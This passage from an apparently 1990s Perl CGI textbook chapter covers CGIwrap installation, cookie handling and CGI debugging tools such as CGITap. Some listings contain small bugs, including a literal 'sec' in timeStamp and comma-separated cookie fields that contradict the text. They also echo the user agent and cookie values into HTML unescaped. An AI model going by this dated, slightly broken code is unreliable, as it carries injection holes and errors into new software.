<P>In addition to this security advantage, CGIwrap is also an excellent 
debugging tool. When CGIwrap is installed it is copied to cgiwrapd which can be 
used to view output of failing CGIs. 
<P>You can install CGIwrap by following these steps. 
<P>
<OL>
  <LI>Obtain the source from the <B><A 
  href="http://www.umr.edu/~cgiwrap/download.html">http://www.umr.edu/~cgiwrap/download.html</A></B> 
  web page. 
  <P></P>
  <LI>Ensure that you have root access. 
  <P></P>
  <LI>Unpack and run the Configure script. 
  <P></P>
  <LI>Type <B>make</B>. 
  <P></P>
  <LI>With a user id of root, copy the <TT>cgiwrap</TT> executable to your 
  server's <TT>cgi-bin</TT> directory. 
  <P></P>
  <LI>Make sure that <TT>cgiwrap</TT> is owned by root and executable by all 
  users by typing <B>chown root cgiwrap; chmod 4755 cgiwrap</B>. The 
  <TT>cgiwrap</TT> executable must also be setuid. 
  <P></P>
  <LI>In order to gain the debugging advantages of CGIwrap, create symbolic 
  links to <TT>cgiwrap</TT> called <TT>cgiwrapd</TT>, <TT>nph-cgiwrap</TT>, and 
  <TT>nph-cgiwrapd</TT>. The first symbolic link can be created by typing <B>ln 
  -s cgiwrap cgiwrapd</B>. The others are created using similar 
commands.</LI></OL>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightpink size=4><B>Tip</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightpink>You can find additional information at the <B><A 
      href="http://www.umr.edu/~cgiwrap/install.html">http://www.umr.edu/~cgiwrap/install.html</A></B> 
      web site.</TD></TR></TBODY></TABLE>
<P>CGIs that run using CGIwrap are stored in a <TT>cgi-bin</TT> directory under 
an individual user's public web directory and called like this: 
<P><B><PRE>http://servername/cgi-bin/cgiwrap/~userid/scriptname</PRE></B>To debug a 
script run via cgiwrap add the letter "d" to <TT>cgiwrap</TT>: 
<P><B><PRE>http://servername/cgi-bin/cgiwrapd/~userid/scriptname</PRE></B>When you use 
CGIwrap to debug your CGI programs, quite a lot of information will be displayed 
in the web brower's window. For example, if you called a CGI program with the 
following URL: 
<P><B><PRE>http://www.engr.iupui.edu/cgi-bin/cgiwrapd/~dbewley/cookie-test.pl</PRE></B>The 
output might look like this: 
<P><B><PRE>Redirecting STDERR to STDOUT
Setting Limits (CPU)
Environment Variables:
   QUERY_STRING: ''
   PATH_INFO: '/~dbewley/cookie-test.pl'
   REMOTE_HOST: 'x2s5p10.dialin.iupui.edu'
   REMOTE_ADDR: '134.68.249.69'
   SCRIPT_NAME: '/cgi-bin/cgiwrapd'
Trying to extract user/script from PATH_INFO
Extracted Data:
   User:  'dbewley'
   Script:  'cookie-test.pl'
Stripping user and script data from PATH_INFO env. var.
Adding user and script to SCRIPT_NAME env. var.
Modified Environment Variables:
   PATH_INFO: ''
   SCRIPT_NAME: '/cgi-bin/cgiwrapd/dbewley/cookie-test.pl'
Sanitize user name: 'dbewley'-'dbewley'
Sanitize script name: 'cookie-test.pl'-'cookie-test.pl'
Log Request
   Opening log file.
   Writing log entry.
   Closing log file.
   Done logging request.
User Data Retrieved:
   UserName: 'dbewley'
   UID: '8670'
   GID: '200'
   Directory: '/home/stu/d/dbewley'
UIDs/GIDs Changed To:
   RUID: '8670'
   EUID: '8670'
   RGID: '200'
   EGID: '200'
Current Directory:  '/sparcus/users/dbewley/www/cgi-bin'
Results of stat:
   File Owner: '8670'
   File Group: '200'
   Exec String:  './cookie-test.pl'
Output of script follows:
=====================================================
Set-Cookie: user=dbewley; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.engr.iupui.edu;
Set-Cookie: flag=black; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.iupui.edu;
Set-Cookie: car=honda:accord:88:LXI:green; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.engr.iupui.edu;
Content-type: text/html
Cookies:&lt;BR&gt;
flag = black&lt;br&gt;
car = honda:accord:88:LXI:green&lt;br&gt;
user = dbewley&lt;br&gt;</PRE></B>This output can be invaluable if your script 
is dying because of a syntax error before it can print an HTTP header to the 
browser. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightcyan size=4><B>Note</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightcyan>If you'd like a more in-depth description of CGI 
      Security visit these web sites: 
      <P><B><PRE><A href="http://www.umr.edu/~cgiwrap/">http://www.umr.edu/~cgiwrap/</A>   # CGIwrap Home Page</PRE></B></TD></TR></TBODY></TABLE>
<H2><A name=Cookies>Cookies</A></H2>Most webmasters want to track the progress 
of a user from page to page as they click about the site. Unfortunately, HTTP is 
a <I>stateless</I> protocol. Stateless protocols have no memory, they only 
understand the current command. This makes tracking a visitor through a site 
difficult at best. A user could visit a site leave and come back a day or a 
minute later, possibly from a different IP address and the site maintainer has 
no way of knowing if this is the same browser or not. 
<P>One answer to this dilemma is to use <I>cookies</I> in your CGI programs. 
Cookies can provide a way to maintain information from one HTTP request to the 
next - remember the concept of persistent information? 
<P>A cookie is a small chunk of data, stored on the visitor's local hard drive 
by the web sever. It can be used to track your path through a web site and 
develop a visitor's profile for marketing or informational purposes. Cookies can 
also be used to hold information like account numbers and purchase decisions so 
that shopping applications can be created. 
<H3><A name="Cookie Security">Cookie Security</A></H3>There has been some 
controversy about whether cookies are secure. Although the cookie mechanism 
provides a way for a web server to write data to your hard disk the limitations 
are very strict. A client may only hold a maximum of 300 cookies at a time and a 
single server may only give 20 cookies to it. Cookies can only be 4 kilobytes 
each, including the name and data, so at most a visitor's hard disk may have 1.2 
megabytes of hard disk being used to store cookies. In addition, cookie data may 
only be written to one file, usually called <TT>cookies.txt</TT>. 
<P>During a browsing session Netscape stores cookies in memory, but when the 
browser is exited cookies are written into a file called <TT>cookies.txt</TT>. 
On the Macintosh the cookie jar is in a file called <TT>MagicCookie</TT> in the 
preferences folder. The cookie file contains plain text as shown in Listing 
19.3. 
<H3><A name="How Are Cookies Created And Read">How Are Cookies Created And 
Read?</A></H3>Cookies are set using a <TT>Set-cookie:</TT> HTTP header with 5 
possible fields separated with a semicolon and a space. These fields are: 
<P>
<UL>
  <LI><B>cookie-name=cookie-value;</B> - name of the cookie and its value. The 
  name and the value combined must be less than 4 kilobytes in length. 
  <P></P>
  <LI><B>expires=expiration-date;</B> - the date the cookie will be deleted from 
  the cookie file. You can delete a previously set cookie ahead of schedule, by 
  creating a second cookie with the same name, path, and domain, but with an 
  expiration date in the past. 
  <P></P>
  <LI><B>path=cookie-path;</B> - Combines with the domain name to determine when 
  a browser should show a cookie to the server. 
  <P></P>
  <LI><B>domain=server-domain;</B> - Used to determine when a browser should 
  show a cookie to the server. Usually, cookies are created with the web 
  server's name without the <TT>www</TT>. For example, <TT>.foo.net</TT> instead 
  of <TT>www.foo.net</TT>. Notice that the leading period is retained. 
  <P></P>
  <LI><B>secure</B> - ensures that the cookie will only be sent back to the 
  server when a secure HTTP connection has been established.</LI></UL>
<P>When all of these elements are put together they look like this: 
<P><B><PRE>Set-Cookie: user_addr=ppp1.dialin.iupui.edu; [iccc]
    expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; [iccc]
    domain=.engr.iupui.edu; secure</PRE></B>Listing 19.4 contains a program that 
both sets and read cookies. First, it will create four cookies and then it will 
read those cookies from the <TT>HTTP_COOKIE</TT> environment variable. Inside 
the HTTP_COOKIE environment variable, the cookies are delimited by a semi-colon 
and a space. The cookie fields are separated by commas, and the name-value pairs 
are separated by equal signs. In order to use cookies, you need to parse the 
HTTP_COOKIE variable at three different levels. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Turn on the warning option. 
      <P>Turn on the strict pragma. 
      <P>Declare a variable to hold the expiration date and time of the cookies. 

      <P>Declare a variable to hold the domain name. 
      <P>Declare a variable to hold the path name. 
      <P>Set four cookies with different values. 
      <P>Read those four cookies from the environment place them into %cookies. 
      <P>Start the HTML web page. 
      <P>Display a text heading on the web page. 
      <P>Start an HTML table. 
      <P>Display each cookie in a table row. 
      <P>End the table. 
      <P>End the web page. 
      <P>Define the setCookie() function. 
      <P>Create local variables from the parameter array. 
      <P>Send the Set-Cookie: HTTP header to the web browser. 
      <P>Send the secure option only if requested. 
      <P>End the header with a newline. 
      <P>Define the getCookies() function. 
      <P>Create a local hash to hold the cookies. 
      <P>Iterate over an array created by splitting the HTTP_COOKIE environment 
      variable based on the "; " character sequence. 
      <P>Split off the name of the cookie. 
      <P>Create a hash entry with the cookie's name as the key and the rest of 
      the cookie as the entry's value. 
      <P>Return the hash. </TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.4-19LST04.PL - How to Set and Retrieve 
    Cookies</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>#!/usr/local/bin/perl -w
use strict;

my($expDate)   = "Wednesday, 09-Nov-99 00:00:00 GMT";
my($theDomain) = ".engr.iupui.edu";
my($path)      = "/cgi-bin/";

setCookie("user", "dbewley", $expDate, $path, $theDomain);

setCookie("user_addr", $ENV{'REMOTE_HOST'}, $expDate, $path, $theDomain)
    if defined($ENV{'REMOTE_HOST'});

setCookie("flag", "black", $expDate, $path, ".iupui.edu");
setCookie("car", "honda:accord:88:LXI:green", $expDate, $path, $theDomain);

my(%cookies) = getCookies();

print("Content-type: text/html\n\n");
print("&lt;HTML&gt;");
print("&lt;HEAD&gt;&lt;TITLE&gt;The Cookie Display&lt;/TITLE&gt;&lt;/HEAD&gt;");
print("&lt;BODY&gt;");
print("&lt;H1&gt;Cookies&lt;/H1&gt;");
print("&lt;TABLE BORDER=1 CELLPADDING=10&gt;");
foreach (sort(keys(%cookies))) {
    print("&lt;TR&gt;&lt;TD&gt;$_&lt;/TD&gt;&lt;TD&gt;$cookies{$_}&lt;/TD&gt;&lt;/TR&gt;");
}
print("&lt;/TABLE&gt;");
print("&lt;/BODY&gt;");
print("&lt;/HTML&gt;");


sub setCookie {
    my($name, $val, $exp, $path, $dom, $secure) = @_;

    print("Set-Cookie: ");
    print("$name=$val, expires=$exp, path=$path, domain=$dom");
    print(", $secure") if defined($secure);
    print("\n");
}

sub getCookies {
    my(%cookies);

    foreach (split (/; /,$ENV{'HTTP_COOKIE'})){
        my($key) = split(/=/, $_);

        $cookies{$key} = substr($_, index($_, "=")+1);
    }
    return(%cookies);
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>This program shows that the web server stores a copy of any cookies that you 
set into the <TT>HTTP_COOKIE</TT> environment variable. It only performs one 
level of parsing. In order to create a really useful <TT>getCookies()</TT> 
function, you need to split the cookie on the comma character and then again on 
the equals character. 
<H3><A name="Can a Visitor's Browser Support Cookies">Can a Visitor's Browser 
Support Cookies?</A></H3>One difficulty that you may have in using cookies is 
that not every browser can support them. If you are using cookies, you need a 
user-friendly way of telling a visitor that the feature they are trying to use 
is not available to them. 
<P>Listing 19.5 contains a script that shows you a nice way of automatically 
determining if a visitor's web browser supports cookies. The CGI program will 
set a cookie and then redirect the visitor's web browser back to itself with 
some additional path information. When the script (during its second invocation) 
sees the extra path information, it checks for the previously created cookie. If 
it exists, the visitor's browser has passed the test. Otherwise, the visitor's 
browser does not support cookies. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Turn on the warning option. 
      <P>Turn on the strict pragma. 
      <P>If there is no query information, then set a cookie and reload the 
      script. 
      <P>Otherwise, see if the cookie set before the reload exists. 
      <P>If the cookie exists, the browser supports cookies. 
      <P>If the cookie does not exist, the browser does not support 
      cookies.</TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.5-19LST05.PL - How to Tell If the Visitor's Browser Supports 
      Cookies</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>#!/usr/bin/perl -w
use strict;

if ($ENV{'QUERY_STRING'} ne 'TESTING') {
    print "HTTP/1.0 302 Moved Temporarily\n";
    print "Set-Cookie: Cookie=Test\n";
    print "Location: $ENV{'SCRIPT_NAME'}?TESTING\n\n";
}
else {
    if ($ENV{'HTTP_COOKIE'} =~ /Cookie=Test/) {
        print("Content-type: text/html\n\n");
        print("&lt;HTML&gt;");
        print("&lt;HEAD&gt;&lt;TITLE&gt;$ENV{'HTTP_USER_AGENT'} supports Cookies&lt;/TITLE&gt;&lt;/HEAD&gt;");
        print("&lt;BODY&gt;");
        print("Your browser, $ENV{'HTTP_USER_AGENT'}, supports the Netscape HTTP ");
        print("Cookie Specification.");
        print("&lt;/BODY&gt;&lt;/HTML&gt;");
    }
    else {
        print("Content-type: text/html\n\n");
        print("&lt;HTML&gt;");
        print("&lt;HEAD&gt;&lt;TITLE&gt;$ENV{'HTTP_USER_AGENT'} doesn't support Cookies&lt;/TITLE&gt;&lt;/HEAD&gt;");
        print("&lt;BODY&gt;");
        print("Your browser, $ENV{'HTTP_USER_AGENT'}, doesn't appear to support cookies.");
        print("Cookie Specification.");
        print("&lt;/BODY&gt;&lt;/HTML&gt;");
    }
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=lightcyan size=4><B>Note</B></FONT></TD></TR>
  <TR>
    <TD bgColor=lightcyan>You can find more information about cookies at these 
      web sites: 
      <P><PRE>http://home.netscape.com/newsref/std/cookie_spec.html
http://www.netscapeworld.com/netscapeworld/nw-07-1996/nw-07-cookies.html
http://www.emf.net/~mal/cookiesinfo.html
http://ds.internic.net/internet-drafts/draft-ietf-http-state-mgmt-03.txt
http://www.illuminatus.com/cookie/
http://www.jasmin.com/cook0696.html
http://www.bravado.net/rodgers/InterNetNews.html</PRE></TD></TR></TBODY></TABLE>
<H2><A name="Debugging CGI Programs">Debugging CGI Programs</A></H2>One of the 
main reasons to use CGI program is to generate HTML documents. When something 
goes wrong, the common error message will be <TT>500 Server Error</TT>. This 
message can be caused by several things. For example, the #! comment at the top 
of your script could be invalid, the first line of output was an invalid HTTP 
header, there might not be a blank line after the HTTP header, or you could 
simply have a syntax error. 
<H3><A name="Sending Output to the Server's Log File">Sending Output to the 
Server's Log File</A></H3>When your CGI program starts, the <TT>STDERR</TT> file 
handle is connected to the server's error log. You can use STDERR to save status 
messages that you don't want the user to see. The advantage of using STDERR is 
that you don't need to open or close a file. In addition, you'll always know 
where the messages are. This is important if you're working on a team. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Send the HTTP header indicating a plain text document. 
      <P>Send a line of text. 
      <P>Call the logError() function to send a message to the server's log 
      file. 
      <P>Call the logError() function to send a message to the server's log 
      file. 
      <P>Send a line of text. 
      <P>Define the logError() function. 
      <P>Declare a local variable to hold the message. 
      <P>Print the message to STDERR with a timestamp. 
      <P>Define the timeStamp() function. 
      <P>Declare some local variables to hold the current date and time. 
      <P>Call the zeroFill() function to format the numbers. 
      <P>Return a formatted string holding the current date and time. 
      <P>Define the zeroFill() function - turns "1" into "01". 
      <P>Declare a local variable to hold the number to be filled. 
      <P>Declare a local variable to hold the string length that is needed. 
      <P>Find difference between current string length and needed length. 
      <P>If the string is big enough (like "12") then return it. 
      <P>If the string is too big, prefix it with some 
  zeroes.</TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.6-19LST06.PL - Sending Messages to the Server's Error 
      Log</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>print("Content-type: text/plain\n\n");
print("This is line one.\n");
logError("GOOD Status\n");
logError("BAD  Status\n");
print("This is line two.\n");

sub logError {
    my($msg) = shift;
    print STDERR (timeStamp(), " $msg");
}

sub timeStamp {
    my($sec, $min, $hour, $mday, $mon, $year) = (localtime(time))[0..5];
    $mon  = zeroFill($mon, 2);
    $hour = zeroFill($hour, 2);
    $min  = zeroFill($min, 2);
    $sec  = zeroFill($sec, 2);
    return("$mon/$mday/$year, $hour:$min:sec");
}

sub zeroFill {
    my($temp) = shift;
    my($len)  = shift;
    my($diff) = $len - length($temp);

    return($temp) if $diff &lt;= 0;
    return(('0' x $diff) . $temp);
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=tomato size=4><B>Caution</B></FONT></TD></TR>
  <TR>
    <TD bgColor=tomato>According to the CGI specifications the <TT>STDERR</TT> 
      file handle should be connected to the server's error log. However, I 
      found that this was not true when using Windows 95 and O'Reilly's Website 
      server software. There may be other combinations of operating systems and 
      server software that also fail to connect <TT>STDERR</TT> to the error 
    log.</TD></TR></TBODY></TABLE>
<H3><A name="Sending STDERR to the Web Browser">Sending <TT>STDERR</TT> to the 
Web Browser</A></H3>If want your users to see the error messages your script 
generates, use the <TT>open()</TT> function to redirect <TT>STDERR</TT> to 
<TT>STDOUT</TT> like this: 
<P><B><PRE>open(STDERR, "&gt;&amp;STDOUT");</PRE></B>After that statement is executed 
the output of all print statements that use the <TT>STDERR</TT> file handle will 
be displayed in the web browser window. 
<P>You need to be a little careful when using this ability. Your normal error 
messages will not have the HTML tags required to make them display properly. 
<H3><A name=CGITap>CGITap</A></H3>CGITap (<B><A 
href="http://scendtek.com/cgitap/">http://scendtek.com/cgitap/</A></B>) is a CGI 
debugging aid that can help pinpoint the problem in a troubling CGI application. 
CGITap installs in the <TT>cgi-bin</TT> directory and runs any CGI programs in 
"tap mode". Tap mode runs the CGI program as normal, however, the output 
contains additional diagnostic and environment information. This information can 
greatly speed up the process of debugging your CGI scripts. 
<P>CGITap may be installed in any CGI enabled directory and requires perl4.036 
or later. You can install CGITap by following these steps: 
<P>
<OL>
  <LI>Download the CGITap script from the <B><A 
  href="http://scendtek.com/cgitap/">http://scendtek.com/cgitap/</A></B> web 
  page. 
  <P></P>
  <LI>Install CGITap in a CGI enabled directory - typically named 
  <TT>cgi-bin</TT>. 
  <P></P>
  <LI>As with any perl script, be sure the first line of CGITap contains the 
  correct path to your systems perl interpreter. You should be familiar with the 
  location. If not, try typing <B>which perl</B> on the UNIX command line. 
  <P></P>
  <LI>Check the file permissions to ensure that CGITap is executable.</LI></OL>
<P>CGITap has two methods of debugging. The first is adequate for simple CGI 
applications which do not use HTML forms for input. The second method is used 
for CGI programs which process HTML form information. 
<P>For simple CGIs, add <TT>cgitap</TT> to the URL. For example, normally a CGI 
program that just prints the date is called like this: 
<P>http://localhost/cgi-bin/date 
<P>That CGI program might display the following in the browser's window: 
<P><B><PRE>Sun Aug 18 16:07:37 EST 1996</PRE></B>In order to use CGITap for debugging, 
use a similar URL but with cgitap inserted. 
<P><B><PRE>http://localhost/cgi-bin/cgitap/date</PRE></B>CGITap will extract your CGI 
program's name, display the CGI environment to the browser, perform some checks 
on the program, then execute the program and return the actual results (both in 
HTML source, and the actual document). 
<P>CGI programs that process HTML forms will be discussed in Chapter 20, "<A 
href="ch20.htm">Form Processing</A>," but while I'm 
talking about CGITap let me also mention how to use CGITap with HTML Forms. A 
slightly more complicated method must be used for debugging complex CGI scripts 
which require form processing. 
<P>The URL of a form's action is hard coded (via the <TT>ACTION</TT> modifier of 
the <TT>&lt;FORM&gt;</TT> tag) and you may not wish to change it to include 
<TT>cgitap</TT>. To allow CGITap to execute automatically when the form posts to 
its normal action URL, you can make use of UNIX symbolic links. If you are using 
Windows NT or Windows 95, you must change the URL in the HTML form. The steps 
for UNIX platforms are: 
<P>
<OL>
  <LI>Move your CGI script to a new script called <TT>yourscript.tap</TT> by 
  typing <B>mv yourscript yourscript.tap</B>. 
  <P></P>
  <LI>Make a symbolic link called <TT>yourscript</TT> to <TT>cgitap</TT> by 
  typing <B>ln -s cgitap yourscript</LI></OL></B>
<P>For example, let's assume you have a CGI script called <TT>mailit</TT> that 
processes form input data, mails the information to you and returns an HTML page 
to the web browser. To debug this script, move <TT>mailit</TT> to 
<TT>mailit.tap</TT> using the following command: 
<P><B><PRE>mv mailit mailit.tap</PRE></B>Then create a link to <TT>cgitap</TT> using 
this command: 
<P><B><PRE>ln -s cgitap mailit</PRE></B>Now you can fill in the HTML form and submit 
it as usual. 
<P>This method allows UNIX-based scripts and forms to be debugged without having 
to change hard coded URL's in your HTML documents. When the form is posted the 
results will be the CGITap debugging information, followed by the normal output 
of mailit. 
<H3><A name="Generating an Error HTML Page">Generating an Error HTML 
Page</A></H3>It is a good idea to isolate all program statements that have a 
high probability to generate errors at the beginning of your program. Or at 
least, before the HTTP header is sent. This lets you create HTML response pages 
that correspond to the specific error that was encountered. Listing 19.7 shows a 
simple example of this concept. You could expand this example to cover many 
different errors that can occur. 
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=blanchedalmond 
      size=4><B>Pseudocode</B></FONT></TD></TR>
  <TR>
    <TD bgColor=blanchedalmond><TT>
      <P>Try (and fail) to open a file. Call the error() function. 
      <P>Define the error() function. 
      <P>Declare a local variable to hold the error message string. 
      <P>Output an HTML page to display the error 
message.</TT></P></TD></TR></TBODY></TABLE>
<P>
<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=#fffaa0 size=4><B>
      <P>Listing 19.7-19LST07.PL - Generating an Error Response Using 
      HTML</B></FONT></P></TD></TR>
  <TR>
    <TD bgColor=#fffaa0><B><PRE><BR>
<P>open(FILE, 'AAAA.AAA') or error("Could not open file AAAA.AAA");

sub error {
    my($message) = @_;

    print("Content-type: text/html\n\n");
    print("&lt;HTML&gt;\n");
    print("&lt;HEAD&gt;&lt;TITLE&gt;CGI Error&lt;/TITLE&gt;&lt;/HEAD&gt;\n");
    print("&lt;H1&gt;Status: 500 An Error Has Occured&lt;/H1&gt;\n");
    print("&lt;HR&gt;\n");
    print("$message\n");
    print("&lt;/BODY&gt;\n");
    print("&lt;/HTML&gt;\n");
}</B></P></PRE></TT></TD></TR></TBODY></TABLE>
<P>I'm sure you agree that error messages that you provide are more informative 
than the standard ones. 
<H2><A name=Summary>Summary</A></H2>This chapter certainly covered a lot of 
material. It started by defining CGI as an interface between web servers and 
external programs. Then, you read why Perl is a great programming language to 
use when writing CGI programs. Next, the chapter touched on CGI applications 
versus Java applets and how they are complementary technologies. 
<P>After those introductory comments, the fun started. CGI programs were shown 
to be invoked by a URL. The URL could be entered directly into a web browser or 
stored in a web page as a hypertext link or the destination for HTML form 
information. 
<P>Before CGI program can be run under the UNIX operating systems, their file 
permissions need to be set correctly. Files have three types of permissions: 
read, write, and execute. And there are three types of users that access files: 
user, group, and others. CGI programs must be both readable and executable by 
others. 
<P>The first line of output of any CGI program must be some type of HTTP header. 
The most common header is <TT>Content-type:</TT> which basically tells the web 
browser what to expect (plain text, perhaps? Or maybe some HTML). The 
<TT>Location:</TT> header redirects the web browser to another URL. The 
<TT>Set-cookie:</TT> header stores a small bit of information on the visitor's 
local disk. The last header is <TT>Status:</TT>, which tells the web browser 
that an error has arisen. 
<P>By placing a <TT>/</TT> or <TT>?</TT> at the end of a URL, information can be 
passed to the CGI program. Information after a <TT>/</TT> is placed into the 
<TT>PATH_INFO</TT> environment variable. Information after a <TT>?</TT> is 
placed into the <TT>QUERY_STRING</TT> environment variable. 
<P>Environment variables play a big role in CGI programs. They are the principal 
means that web servers use to provide information. For example, you can find out 
the client's IP address using the REMOTE_ADDR variable. And the SCRIPT_NAME 
variable contains the name of the current program. 
<P>URL encoding is used to prevent characters from being misinterpreted. For 
example, the <TT>&lt;</TT> character is usually encoded as <TT>%3C</TT>. In 
addition, most spaces are converted into plus signs. Listing 19.1 contains a 
function called <TT>decodeURL()</TT> that will decode the URL encoding. 
<P>One of the biggest security risks happens when a user's data (form input or 
extra path information) is exposed to operating system commands like 
<TT>mail</TT> or <TT>grep</TT>. <B>Never trust user input!</B> Always suspect 
the worst. Most hackers spend many hours looking at manuals and source code to 
find software weaknesses. You need to read about web security in order to 
protect your site. 
<P>The CGIwrap program offers a way to limit the damage potential by running CGI 
program with a user id that is different from the web server's. The programs are 
running using the user's user id so that damage is limited to your home 
directory. 
<P>Cookies are used to store information on the user's hard drive. They are a 
way to create persistent information that lasts from one visit to the next. 
<P>You can debug CGI programs by sending messages to the server's log file using 
the STDERR file handle. Or you could redirect STDERR to STDOUT so that the 
messages appear in the client web browser's window. If you have a complex 
problem, consider using CGItap, a program that lets you see all of the 
environment variables available to your program. 
<P>The next chapter, "<A href="ch20.htm">Form 
Processing</A>," will introduce you to HTML Forms and how CGI programs can 
process form information. After the introduction, a Guest book application will 
be presented. Guest books let visitors leave comments that can be viewed later 
by other visitors. 
<H2><A name="Review Questions">Review Questions</A></H2>
<OL>
  <LI>Is CGI a programming language? 
  <P></P>
  <LI>Are CGI and Java the same type of protocol? 
  <P></P>
  <LI>Do CGI program files need to have the write right turned on? 
  <P></P>
  <LI>What is the first line of output for CGI programs? 
  <P></P>
  <LI>What information does the HTTP_USER_AGENT contain? 
  <P></P>
  <LI>Why is CGItap a useful program?</LI></OL>
<H2><A name="Review Exercises">Review Exercises</A></H2>
<OL>
  <LI>Convert the program in Listing 19.1 so that it displays a HTML document. 
  <P></P>
  <LI>Convert the program in Listing 19.1 so that it uses the <TT>Location:</TT> 
  HTTP header. 
  <P></P>
  <LI>Convert the program in Listing 19.1 so that it displays all environment 
  variables Hint: <TT>foreach (sort(keys(%ENV))) { ... }</TT>. 
  <P></P>
  <LI>Write a CGI script that print "Thanks, you're doing a great job!" in your 
  web server's error log file.</LI></OL>